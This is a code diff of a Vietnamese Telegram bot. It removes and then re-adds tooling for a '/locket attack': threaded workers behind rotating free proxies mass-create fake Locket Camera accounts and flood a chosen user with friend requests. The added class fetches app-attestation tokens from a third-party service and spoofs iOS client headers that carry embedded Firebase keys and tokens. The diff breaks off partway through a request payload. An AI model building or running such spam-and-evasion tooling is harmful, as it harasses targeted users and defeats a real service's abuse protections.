@@ -327,426 +327,6 @@ def send_message_robustly(chat_id, text=None, photo=None, caption=None, reply_ma
 
 # === LỆNH XỬ LÝ TIN NHẮN ===
 
-# --- THÊM VÀO PHẦN KHAI BÁO BIẾN TOÀN CỤC CỦA BOT ZPROJECT CỦA BẠN ---
-import threading
-import time
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-import logging
-import datetime
-import random
-import string
-import re
-import queue
-import requests
-from requests.exceptions import ProxyError
-
-# Cài đặt cấu hình logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-
-# Biến toàn cục cho quản lý trạng thái của lệnh /locket
-# user_id: { 'step': 'waiting_for_target', 'target': None, 'message_id': None, 'chat_id': None, 'spam_thread': None, 'last_action_time': None, 'current_attack_count': 0 }
-locket_states = {}
-locket_states_lock = threading.Lock()
-
-# Biến toàn cục cho Rate Limiting
-LAST_LOCKET_COMMAND_TIME = {}
-RATE_LIMIT_DURATION = 300 # 5 phút = 300 giây
-
-# Biến toàn cục cho Proxy
-proxy_queue = queue.Queue()
-last_proxy_update_time = 0
-proxy_update_interval = 300 # 5 phút
-
-# Định nghĩa các nguồn proxy miễn phí và uy tín (cập nhật nếu cần)
-FREE_PROXY_SOURCES = [
-    'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
-    'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=20000&country=all&ssl=all&anonymity=all',
-    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt',
-    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt',
-    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
-    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
-    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
-    'https://raw.githubusercontent.com/sunny9577/proxies/master/proxies.txt'
-]
-
-
-
-# --- THÊM VÀO CODE BOT CỦA BẠN (CÙNG VỚI CÁC @bot.message_handler khác) ---
-
-@bot.message_handler(commands=["locket"])
-# @increment_interaction_count # Nếu bạn có hàm này để đếm tương tác, hãy bỏ comment
-def handle_locket_command(message):
-    user_id = message.from_user.id
-    chat_id = message.chat.id
-
-    # Kiểm tra quyền admin
-    if user_id != ADMIN_ID:
-        return send_message_robustly(chat_id, text="🚫 Bạn không có quyền sử dụng lệnh này.", parse_mode="HTML", reply_to_message_id=message.message_id)
-
-    # Kiểm tra rate limit
-    with locket_states_lock:
-        last_time = LAST_LOCKET_COMMAND_TIME.get(user_id)
-        current_time = time.time()
-        if last_time and (current_time - last_time < RATE_LIMIT_DURATION):
-            remaining_time = int(RATE_LIMIT_DURATION - (current_time - last_time))
-            return send_message_robustly(
-                chat_id,
-                text=f"⏳ Vui lòng chờ <b>{remaining_time} giây</b> nữa trước khi sử dụng lại lệnh /locket.",
-                parse_mode="HTML",
-                reply_to_message_id=message.message_id
-            )
-        LAST_LOCKET_COMMAND_TIME[user_id] = current_time
-
-    # Xóa trạng thái cũ nếu có
-    with locket_states_lock:
-        if user_id in locket_states:
-            del locket_states[user_id]
-
-    # Tin nhắn ban đầu: Đang kiểm tra...
-    checking_msg = send_message_robustly(
-        chat_id,
-        text="⏳ Đang kiểm tra link/username Locket...",
-        parse_mode="HTML",
-        reply_to_message_id=message.message_id
-    )
-
-    if not checking_msg:
-        logging.error(f"Failed to send initial checking message for user {user_id}")
-        return
-
-    # Lưu trạng thái ban đầu
-    with locket_states_lock:
-        locket_states[user_id] = {
-            'step': 'waiting_for_target',
-            'target': None,
-            'message_id': checking_msg.message_id, # Lưu ID tin nhắn để chỉnh sửa
-            'chat_id': chat_id,
-            'spam_thread': None, # Luồng spam sẽ được lưu ở đây
-            'current_attack_count': 0 # Đếm số vòng spam hiện tại
-        }
-
-    # Trích xuất username/link từ tin nhắn
-    command_args = message.text.replace("/locket", "").strip()
-
-    if not command_args:
-        # Yêu cầu người dùng cung cấp username/link
-        bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=checking_msg.message_id,
-            text="⚠️ Vui lòng cung cấp Username hoặc Link Locket. Ví dụ: <code>/locket wusthanhdieu</code> hoặc <code>/locket https://locket.cam/wusthanhdieu</code>",
-            parse_mode="HTML"
-        )
-        return
-
-    # Bắt đầu luồng kiểm tra Locket UID trong nền
-    threading.Thread(target=check_locket_target_thread, args=(user_id, command_args)).start()
-
-
-def check_locket_target_thread(user_id, target_input):
-    with locket_states_lock:
-        state = locket_states.get(user_id)
-        if not state:
-            logging.error(f"State for user {user_id} not found during Locket target check.")
-            return
-
-    chat_id = state['chat_id']
-    message_id = state['message_id']
-
-    # Sử dụng hàm _extract_uid_locket từ zlocket_bot_handler
-    zlocket_bot_handler.messages = [] # Xóa thông báo lỗi cũ
-    locket_uid = zlocket_bot_handler._extract_uid_locket(target_input)
-
-    if locket_uid:
-        with locket_states_lock:
-            state['target'] = locket_uid
-            state['step'] = 'target_checked'
-            locket_states[user_id] = state # Cập nhật lại state
-
-        bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text=f"✅ Đã tìm thấy Locket!\n\n"
-                 f"<b>Locket UID:</b> <code>{locket_uid}</code>\n"
-                 f"<b>Username/Link:</b> <code>{html_escape(target_input)}</code>\n\n"
-                 "Bạn có muốn khởi động tấn công (spam kết bạn) Locket này không?",
-            parse_mode="HTML",
-            reply_markup=get_locket_action_markup()
-        )
-        logging.info(f"Locket target {locket_uid} found for user {user_id}")
-    else:
-        error_msg = "\n".join(zlocket_bot_handler.messages)
-        if not error_msg:
-            error_msg = "Không xác định. Vui lòng kiểm tra lại username/link."
-
-        bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text=f"❌ Không tìm thấy Locket hoặc Link không hợp lệ.\n\n"
-                 f"<b>Lỗi:</b> {html_escape(error_msg)}\n\n"
-                 "Vui lòng thử lại với lệnh <code>/locket &lt;username/link&gt;</code>.",
-            parse_mode="HTML"
-        )
-        # Xóa trạng thái sau khi lỗi
-        with locket_states_lock:
-            if user_id in locket_states:
-                del locket_states[user_id]
-        logging.warning(f"Locket target not found for user {user_id}: {error_msg}")
-
-
-def get_locket_action_markup():
-    markup = InlineKeyboardMarkup()
-    markup.add(
-        InlineKeyboardButton("🚀 Bật Attack", callback_data="locket_action|start_attack"),
-        InlineKeyboardButton("⛔️ Tắt Attack", callback_data="locket_action|cancel")
-    )
-    return markup
-
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith("locket_action|"))
-def handle_locket_action_callback(call):
-    user_id = call.from_user.id
-    chat_id = call.message.chat.id
-    message_id = call.message.message_id
-    action = call.data.split("|")[1]
-
-    # Đảm bảo chỉ người dùng tạo lệnh mới có thể tương tác
-    with locket_states_lock:
-        state = locket_states.get(user_id)
-        if not state or state['message_id'] != message_id:
-            bot.answer_callback_query(call.id, "Phiên làm việc đã hết hoặc bạn không phải người tạo lệnh này.", show_alert=True)
-            return
-
-    bot.answer_callback_query(call.id) # Gửi phản hồi callback để tắt loading trên nút
-
-    if action == "start_attack":
-        bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text="⏳ Đang khởi động tấn công Locket...",
-            parse_mode="HTML"
-        )
-        # Bắt đầu luồng tấn công spam
-        spam_thread = threading.Thread(target=start_locket_attack_thread, args=(user_id,))
-        spam_thread.daemon = True # Đảm bảo luồng sẽ dừng khi bot dừng
-        spam_thread.start()
-
-        with locket_states_lock:
-            state['spam_thread'] = spam_thread
-            state['step'] = 'attacking'
-            locket_states[user_id] = state # Cập nhật lại state
-
-    elif action == "cancel":
-        bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text="Đã hủy yêu cầu tấn công Locket.",
-            parse_mode="HTML"
-        )
-        # Xóa trạng thái
-        with locket_states_lock:
-            if user_id in locket_states:
-                del locket_states[user_id]
-
-
-def start_locket_attack_thread(user_id):
-    with locket_states_lock:
-        state = locket_states.get(user_id)
-        if not state or not state.get('target'):
-            logging.error(f"Cannot start Locket attack: invalid state for user {user_id}")
-            return
-
-    chat_id = state['chat_id']
-    message_id = state['message_id']
-    target_uid = state['target']
-
-    zlocket_bot_handler.TARGET_FRIEND_UID = target_uid
-    zlocket_bot_handler.FIREBASE_APP_CHECK = zlocket_bot_handler._load_token_() # Đảm bảo token luôn mới
-
-    if not zlocket_bot_handler.FIREBASE_APP_CHECK:
-        bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text="❌ Lỗi: Không thể lấy token Locket. Vui lòng thử lại sau.",
-            parse_mode="HTML"
-        )
-        with locket_states_lock:
-            if user_id in locket_states:
-                del locket_states[user_id]
-        return
-
-    # Lặp lại 2-3 vòng
-    num_rounds = random.randint(2, 3)
-    successful_rounds = 0
-
-    for round_num in range(1, num_rounds + 1):
-        with locket_states_lock:
-            state = locket_states.get(user_id) # Lấy trạng thái mới nhất
-            if not state or state.get('step') != 'attacking':
-                logging.info(f"Attack stopped prematurely for user {user_id}.")
-                break # Dừng vòng lặp nếu trạng thái thay đổi
-
-        bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text=f"🚀 Đang tấn công Locket <b><code>{html_escape(target_uid)}</code></b>...\n"
-                 f"Vòng: <b>{round_num}/{num_rounds}</b>\n"
-                 f"Tài khoản đã tạo: <b>{zlocket_bot_handler.successful_requests}</b>\n"
-                 f"Yêu cầu thất bại: <b>{zlocket_bot_handler.failed_requests}</b>",
-            parse_mode="HTML"
-        )
-
-        # Lấy một số lượng proxy nhất định cho mỗi vòng tấn công
-        # Để đảm bảo phân phối đều và không làm cạn kiệt nhanh chóng
-        num_proxies_per_round = 10 # Số lượng proxy được lấy từ queue cho mỗi vòng
-        current_round_proxies = []
-        for _ in range(num_proxies_per_round):
-            proxy = get_next_proxy()
-            if proxy:
-                current_round_proxies.append(proxy)
-            else:
-                logging.warning(f"Not enough proxies for round {round_num}. Using {len(current_round_proxies)} available proxies.")
-                break # Không có đủ proxy, dùng số lượng hiện có
-
-        if not current_round_proxies:
-            bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=f"❌ Lỗi: Không có proxy khả dụng cho vòng tấn công {round_num}. Dừng tấn công.",
-                parse_mode="HTML"
-            )
-            break
-
-        threads = []
-        stop_event_attack = threading.Event() # Event để dừng các luồng con nếu cần
-        
-        # Reset lại số liệu thống kê cho mỗi vòng để dễ theo dõi hơn
-        zlocket_bot_handler.successful_requests = 0
-        zlocket_bot_handler.failed_requests = 0
-
-        for i in range(len(current_round_proxies)): # Chỉ cần số lượng luồng bằng số proxy hiện có
-            thread = threading.Thread(
-                target=run_locket_spam_worker,
-                args=(user_id, i, stop_event_attack)
-            )
-            threads.append(thread)
-            thread.start()
-
-        # Chờ các luồng hoàn thành trong vòng này
-        for t in threads:
-            t.join() # Chờ từng luồng hoàn thành
-
-        if zlocket_bot_handler.successful_requests > 0:
-            successful_rounds += 1
-        
-        time.sleep(5) # Nghỉ giữa các vòng
-
-    final_message = f"✅ Đã hoàn tất tấn công Locket <b><code>{html_escape(target_uid)}</code></b>!\n\n"
-    if successful_rounds > 0:
-        final_message += f"<b>Tổng số vòng thành công:</b> {successful_rounds}/{num_rounds}\n"
-        final_message += f"<b>Tổng tài khoản tạo thành công:</b> {zlocket_bot_handler.successful_requests}\n"
-        final_message += f"<b>Tổng yêu cầu thất bại:</b> {zlocket_bot_handler.failed_requests}\n\n"
-        final_message += "Đã kết thúc quá trình attack."
-    else:
-        final_message = f"❌ Không thể tấn công Locket <b><code>{html_escape(target_uid)}</code></b>.\n"
-        final_message += "Có thể do không có proxy khả dụng hoặc lỗi kết nối. Vui lòng thử lại sau."
-
-
-    bot.edit_message_text(
-        chat_id=chat_id,
-        message_id=message_id,
-        text=final_message,
-        parse_mode="HTML"
-    )
-
-    # Xóa trạng thái sau khi hoàn thành
-    with locket_states_lock:
-        if user_id in locket_states:
-            del locket_states[user_id]
-
-
-def run_locket_spam_worker(user_id, thread_id, stop_event):
-    """
-    Hàm worker cho mỗi luồng spam Locket.
-    Mỗi luồng sẽ cố gắng tạo một số lượng tài khoản/yêu cầu kết bạn nhất định.
-    """
-    with locket_states_lock:
-        state = locket_states.get(user_id)
-    
-    if not state:
-        logging.error(f"Worker {thread_id} failed: No state for user {user_id}")
-        return
-
-    # Mỗi luồng sẽ cố gắng tạo ACC_PER_THREAD tài khoản
-    accounts_per_thread_target = random.randint(6, 10) # Có thể lấy từ config.ACCOUNTS_PER_PROXY
-    
-    successful_accounts_in_thread = 0
-    failed_attempts_in_thread = 0
-    max_failed_attempts_per_thread = 5 # Số lần thử lại tối đa cho 1 luồng nếu gặp lỗi liên tiếp
-
-    while not stop_event.is_set() and \
-          successful_accounts_in_thread < accounts_per_thread_target and \
-          failed_attempts_in_thread < max_failed_attempts_per_thread:
-        
-        if stop_event.is_set():
-            return
-
-        prefix = f"[{thread_id:03d} | Register]"
-        email = _rand_email_()
-        password = _rand_pw_()
-        
-        payload = {
-            "data": {
-                "email": email,
-                "password": password,
-                "client_email_verif": True,
-                "client_token": _rand_str_(40, chars=string.hexdigits.lower()),
-                "platform": "ios"
-            }
-        }
-        
-        response_data = zlocket_bot_handler.excute(
-            f"{zlocket_bot_handler.API_LOCKET_URL}/createAccountWithEmailPassword",
-            headers=zlocket_bot_handler.headers_locket(),
-            payload=payload,
-            thread_id=thread_id,
-            step="Register"
-        )
-
-        if stop_event.is_set():
-            return
-
-        if response_data == "no_proxy" or response_data == "proxy_dead" or response_data == "too_many_requests" or response_data is None:
-            failed_attempts_in_thread += 1
-            logging.warning(f"[{thread_id}] Proxy/Network issue or too many requests. Retrying. Attempts: {failed_attempts_in_thread}/{max_failed_attempts_per_thread}")
-            time.sleep(1) # Chờ một chút trước khi thử lại
-            continue
-        
-        if isinstance(response_data, dict) and response_data.get('result', {}).get('status') == 200:
-            successful_accounts_in_thread += 1
-            failed_attempts_in_thread = 0 # Reset lỗi khi thành công
-
-            id_token, local_id = step1b_sign_in(email, password, thread_id, None)
-            if id_token and local_id:
-                if step2_finalize_user(id_token, thread_id, None):
-                    # Gửi yêu cầu kết bạn ban đầu
-                    if step3_send_friend_request(id_token, thread_id, None):
-                        # Boost thêm 15 yêu cầu
-                        for _ in range(15):
-                            if stop_event.is_set():
-                                return
-                            step3_send_friend_request(id_token, thread_id, None)
-                    else:
-                        logging.warning(f"[{thread_id}] Initial friend request failed for new account.")
-                else:
-                    logging.warning(f"[{thread_id}] Profile finalization failed for new account.")
-            else:
-                logging.warning(f"[{thread_id}] Authentication (step 1b) failed for new account.")
-        else:
-            failed_attempts_in_thread += 1
-            logging.warning(f"[{thread_id}] Identity creation failed. Attempts: {failed_attempts_in_thread}/{max_failed_attempts_per_thread}. Response: {response_data}")
-            # Có thể thêm logic kiểm tra lỗi cụ thể từ response_data để đưa ra hành động phù hợp hơn
-
-    logging.info(f"Worker {thread_id} finished. Created {successful_accounts_in_thread} accounts.")
 
 @bot.message_handler(commands=["start"])
 @increment_interaction_count
@@ -803,6 +383,1126 @@ def help_command(message):
         reply_to_message_id=message.message_id
     )
 
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import sys
+import subprocess
+import os, re, time, json, queue, string, random, threading, datetime
+from queue import Queue
+from itertools import cycle
+from urllib.parse import urlparse, parse_qs, urlencode
+import requests, urllib3
+from requests.exceptions import ProxyError
+from colorama import init, Back, Style
+from typing import Optional, List
+
+# --- Các hàm và lớp từ CTLocket Tool Pro ---
+# Vui lòng dán toàn bộ các hàm và lớp sau vào đây, TRỪ phần if __name__ == "__main__": và _install_():
+# - class xColor
+# - class CTLocket (có điều chỉnh nhỏ ở __init__ và _print)
+# - Các hàm ngoài lớp như _print, _loader_, _sequence_, _randchar_, _blinking_, _rand_str_, _rand_name_, _rand_email_, _rand_pw_, _clear_, typing_print, _matrix_, _banner_, _stats_, load_proxies, init_proxy, format_proxy, get_proxy, excute, step1b_sign_in, step2_finalize_user, step3_send_friend_request, _cd_
+
+# === Dán toàn bộ code từ dòng "class xColor:" đến hết hàm "_cd_" vào đây ===
+class xColor:
+    YELLOW='\033[38;2;255;223;15m'
+    GREEN='\033[38;2;0;209;35m'
+    RED='\033[38;2;255;0;0m'
+    BLUE='\033[38;2;0;132;255m'
+    PURPLE='\033[38;2;170;0;255m'
+    PINK='\033[38;2;255;0;170m'
+    MAGENTA='\033[38;2;255;0;255m'
+    ORANGE='\033[38;2;255;132;0m'
+    CYAN='\033[38;2;0;255;255m'
+    PASTEL_YELLOW='\033[38;2;255;255;153m'
+    PASTEL_GREEN='\033[38;2;153;255;153m'
+    PASTEL_BLUE='\033[38;2;153;204;255m'
+    PASTEL_PINK='\033[38;2;255;153;204m'
+    PASTEL_PURPLE='\033[38;2;204;153;255m'
+    DARK_RED='\033[38;2;139;0;0m'
+    DARK_GREEN='\033[38;2;0;100;0m'
+    DARK_BLUE='\033[38;2;0;0;139m'
+    DARK_PURPLE='\033[38;2;75;0;130m'
+    GOLD='\033[38;2;255;215;0m'
+    SILVER='\033[38;2;192;192;192m'
+    BRONZE='\033[38;2;205;127;50m'
+    NEON_GREEN='\033[38;2;57;255;20m'
+    NEON_PINK='\033[38;2;255;20;147m'
+    NEON_BLUE='\033[38;2;31;81;255m'
+    WHITE='\033[38;2;255;255;255m'
+    RESET='\033[0m'
+class CTLocket:
+    def __init__(self, device_token: str="", target_friend_uid: str="", num_threads: int=1, note_target: str=""):
+        self.FIREBASE_GMPID="1:641029076083:ios:cc8eb46290d69b234fa606"
+        self.IOS_BUNDLE_ID="com.locket.Locket"
+        self.API_BASE_URL="https://api.locketcamera.com"
+        self.FIREBASE_AUTH_URL="https://www.googleapis.com/identitytoolkit/v3/relyingparty"
+        self.FIREBASE_API_KEY="AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
+        self.TOKEN_API_URL="http://spyderxapi.x10.mx/locket/v2/api/token.php"
+        self.SHORT_URL="https://url.thanhdieu.com/api/v1"
+        self.TOKEN_FILE_PATH="token.json"
+        self.TOKEN_EXPIRY_TIME=(20 + 10) * 60
+        self.FIREBASE_APP_CHECK=None
+        self.USE_EMOJI=True
+        self.ACCOUNTS_PER_PROXY=random.randint(6,10)
+        self.NAME_TOOL="Zproject Bot"
+        self.VERSION_TOOL="v1.2"
+        self.TARGET_FRIEND_UID=target_friend_uid if target_friend_uid else None
+        self.PROXY_LIST = [
+    # ===== GitHub Proxy HTTP Raw Links =====
+    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
+    'https://thanhdieu.com/api/list/proxyv3.txt',
+    'https://vakhov.github.io/fresh-proxy-list/http.txt',
+    'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
+    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
+    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
+    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
+    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
+    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies.txt',
+    'https://raw.githubusercontent.com/monosans/proxy-list/main/http.txt',
+    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt',
+    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list/http.txt',
+    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list/http_highanon.txt',
+    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
+    'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt',
+    'https://raw.githubusercontent.com/almroot/proxylist/main/http.txt',
+    'https://raw.githubusercontent.com/hookzof/socks5_list/master/http.txt',
+    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-elite.txt',
+    'https://raw.githubusercontent.com/monosans/proxy-list/main/elite.txt',
+    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt',
+    'https://raw.githubusercontent.com/monosans/proxy-list/main/https.txt',
+    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt',
+    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/http.txt',
+    'https://raw.githubusercontent.com/monosans/proxy-list/main/socks4.txt',
+    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
+    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt',
+
+    # ===== GitLab Proxy HTTP Raw Links =====
+    'https://gitlab.com/roosterkid/openproxylist/-/raw/main/HTTPS.txt',
+    'https://gitlab.com/monosans/proxy-list/-/raw/main/http.txt',
+    'https://gitlab.com/monosans/proxy-list/-/raw/main/elite.txt',
+    'https://gitlab.com/almroot/proxylist/-/raw/main/http.txt',
+    'https://gitlab.com/mertguvencli/http-proxy-list/-/raw/main/proxy-list/data.txt',
+    'https://gitlab.com/almroot/proxylist/-/raw/main/https.txt',
+    'https://gitlab.com/monosans/proxy-list/-/raw/main/https.txt',
+    'https://gitlab.com/mertguvencli/http-proxy-list/-/raw/main/proxy-list/https.txt',
+    'https://gitlab.com/monosans/proxy-list/-/raw/main/socks4.txt',
+    'https://gitlab.com/monosans/proxy-list/-/raw/main/socks5.txt',
+]
+        self.print_lock=threading.Lock()
+        self.successful_requests=0
+        self.failed_requests=0
+        self.total_proxies=0
+        self.start_time=time.time()
+        self.spam_confirmed=False
+        self.discord='discord.gg/VM7ESrzccs'
+        self.author='Nguyễn Minh Nhật'
+        self.messages=[]
+        self.request_timeout=15
+        self.device_token=device_token
+        self.num_threads=num_threads
+        self.note_target=note_target
+        self.session_id=int(time.time() * 1000)
+        self._init_environment()
+        self.FIREBASE_APP_CHECK=self._load_token_()
+        if os.name == "nt":
+            os.system(
+                f"title 💰 {self.NAME_TOOL} {self.VERSION_TOOL} by Nguyen Minh Nhat 💰"
+         )
+    def _print(self, *args, **kwargs):
+        # Đây là hàm print nội bộ, có thể bỏ qua hoặc điều chỉnh để không in ra console nếu chỉ chạy bot
+        # Trong bot Telegram, chúng ta sẽ gửi tin nhắn trực tiếp thay vì in
+        pass
+    def _loader_(self, message, duration=3):
+        pass
+    def _sequence_(self, message, duration=1.5, char_set="0123456789ABCDEF"):
+        pass
+    def _randchar_(self, duration=2):
+        pass
+    def _blinking_(self, text, blinks=3, delay=0.1):
+        pass
+    def _init_environment(self):
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        init(autoreset=True)
+    def _load_token_(self):
+        try:
+            if not os.path.exists(self.TOKEN_FILE_PATH):
+                return self.fetch_token()
+            # self._loader_( # Bỏ qua loader khi chạy bot
+            #     f"{xColor.YELLOW}Verifying token integrity{Style.RESET_ALL}", 0.5)
+            with open(self.TOKEN_FILE_PATH, 'r') as file:
+                token_data=json.load(file)
+            if 'token' in token_data and 'expiry' in token_data:
+                if token_data['expiry'] > time.time():
+                    # self._print( # Bỏ qua print khi chạy bot
+                    #     f"{xColor.GREEN}[+] {xColor.CYAN}Loaded token from file token.json: {xColor.YELLOW}{token_data['token'][:10] + "..." + token_data['token'][-10:]}")
+                    # time.sleep(0.4)
+                    # time_left=int(token_data['expiry'] - time.time())
+                    # self._print(
+                    #     f"{xColor.GREEN}[+] {xColor.CYAN}Token expires in: {xColor.WHITE}{time_left//60} minutes {time_left % 60} seconds")
+                    return token_data['token']
+                else:
+                    # self._print( # Bỏ qua print khi chạy bot
+                    #     f"{xColor.RED}[!]{xColor.RED} Locket token expired, trying to fetch new token")
+                    pass
+            return self.fetch_token()
+        except Exception as e:
+            # self._print( # Bỏ qua print khi chạy bot
+            #     f"{xColor.RED}[!] {xColor.YELLOW}Error loading token from file: {str(e)}")
+            return self.fetch_token()
+    def save_token(self, token):
+        try:
+            token_data={
+                'token': token,
+                'expiry': time.time() + self.TOKEN_EXPIRY_TIME,
+                'created_at': time.time()
+            }
+            with open(self.TOKEN_FILE_PATH, 'w') as file:
+                json.dump(token_data, file, indent=4)
+
+            # self._print( # Bỏ qua print khi chạy bot
+            #     f"{xColor.GREEN}[+] {xColor.CYAN}Token saved to {xColor.WHITE}{self.TOKEN_FILE_PATH}")
+            return True
+        except Exception as e:
+            # self._print( # Bỏ qua print khi chạy bot
+            #     f"{xColor.RED}[!] {xColor.YELLOW}Error saving token to file: {str(e)}")
+            return False
+    def fetch_token(self, retry=0, max_retries=3):
+        if retry == 0:
+            # self._print( # Bỏ qua print khi chạy bot
+            #     f"{xColor.MAGENTA}[*] {xColor.CYAN}Initializing token authentication sequence")
+            # self._loader_("Establishing secure connection", 1)
+            pass
+        if retry >= max_retries:
+            # self._print( # Bỏ qua print khi chạy bot
+            #     f"{xColor.RED}[!] {xColor.YELLOW}Token acquisition failed after {max_retries} attempts")
+            # self._loader_("Emergency shutdown", 1)
+            # sys.exit(1)
+            return None # Trả về None để bot xử lý
+        try:
+            # self._print( # Bỏ qua print khi chạy bot
+            #     f"{xColor.MAGENTA}[*] {xColor.CYAN}Preparing to retrieve token [{retry+1}/{max_retries}]")
+            response=requests.get(self.TOKEN_API_URL, timeout=self.request_timeout, proxies={
+                                    "http": None, "https": None})
+            response.raise_for_status()
+            data=response.json()
+            if not isinstance(data, dict):
+                # self._print( # Bỏ qua print khi chạy bot
+                #     f"{xColor.YELLOW}[!] {xColor.WHITE}Invalid response format, retrying...")
+                time.sleep(0.5)
+                return self.fetch_token(retry + 1)
+            if data.get("code") == 200 and "data" in data and "token" in data["data"]:
+                token=data["data"]["token"]
+                # self._print( # Bỏ qua print khi chạy bot
+                #     f"{xColor.GREEN}[+] {xColor.CYAN}Token acquired successfully")
+                # masked_token=token[:10] + "..." + token[-10:]
+                # self._print(
+                #     f"{xColor.GREEN}[+] {xColor.WHITE}Token: {xColor.YELLOW}{masked_token}")
+                self.save_token(token)
+                return token
+            elif data.get("code") in (403, 404, 502, 503, 504, 429, 500):
+                # self._print( # Bỏ qua print khi chạy bot
+                #     f"{xColor.YELLOW}[!] {xColor.RED}The Locket token server is no longer available, please contact us discord @{self.discord}, trying again...")
+                time.sleep(1.3)
+                return self.fetch_token(retry + 1)
+            else:
+                # self._print( # Bỏ qua print khi chạy bot
+                #     f"{xColor.YELLOW}[!] {xColor.RED}{data.get("msg")}")
+                time.sleep(1.3)
+                return self.fetch_token(retry + 1)
+        except requests.exceptions.RequestException as e:
+            # self._print( # Bỏ qua print khi chạy bot
+            #     f"{xColor.RED}[!] Warning: {xColor.YELLOW}Token unauthorized, retrying... {e}")
+            # self._loader_("Attempting to reconnect", 1)
+            time.sleep(1.3)
+            return self.fetch_token(retry + 1)
+    def headers_locket(self):
+        return {
+            'Host': 'api.locketcamera.com',
+            'Accept': '*/*',
+            'baggage': 'sentry-environment=production,sentry-public_key=78fa64317f434fd89d9cc728dd168f50,sentry-release=com.locket.Locket%401.121.1%2B1,sentry-trace_id=2cdda588ea0041ed93d052932b127a3e',
+            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
+            'Accept-Language': 'vi-VN,vi;q=0.9',
+            'sentry-trace': '2cdda588ea0041ed93d052932b127a3e-a3e2ba7a095d4f9d-0',
+            'User-Agent': 'com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
+            'Firebase-Instance-ID-Token': 'd7ChZwJHhEtsluXwXxbjmj:APA91bFoMIgxwf-2tmY9QLy82lKMEWL6S4d8vb9ctY3JxLLTQB1k6312TcgtqJjWFhQVz_J4wIFvE0Kfroztu1vbZDOFc65s0vvj68lNJM4XuJg1onEODiBG3r7YGrQLiHkBV1gEoJ5f',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/json',
+        }
+    def firebase_headers_locket(self):
+        base_headers=self.headers_locket()
+        return {
+            'Host': 'www.googleapis.com',
+            'baggage': base_headers.get('baggage', ''),
+            'Accept': '*/*',
+            'X-Client-Version': 'iOS/FirebaseSDK/10.23.1/FirebaseCore-iOS',
+            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
+            'X-Ios-Bundle-Identifier': self.IOS_BUNDLE_ID,
+            'X-Firebase-GMPID': '1:641029076083:ios:cc8eb46290d69b234fa606',
+            'X-Firebase-Client': 'H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA',
+            'sentry-trace': base_headers.get('sentry-trace', ''),
+            'Accept-Language': 'vi',
+            'User-Agent': 'FirebaseAuth.iOS/10.23.1 com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
+            'Connection': 'keep-alive',
+            'X-Firebase-GMPID': self.FIREBASE_GMPID,
+            'Content-Type': 'application/json',
+        }
+    def analytics_payload(self):
+        return {
+            "platform": "ios",
+            "experiments": {
+                "flag_4": {
+                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
+                    "value": "43",
+                },
+                "flag_10": {
+                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
+                    "value": "505",
+                },
+                "flag_6": {
+                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
+                    "value": "2000",
+                },
+                "flag_3": {
+                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
+                    "value": "501",
+                },
+                "flag_22": {
+                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
+                    "value": "1203",
+                },
+                "flag_18": {
+                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
+                    "value": "1203",
+                },
+                "flag_17": {
+                    "@type": "type.googleapis.com/google.protobuf.Int64Value",
+                    "value": "1010",
+                },
+                "flag_16": {
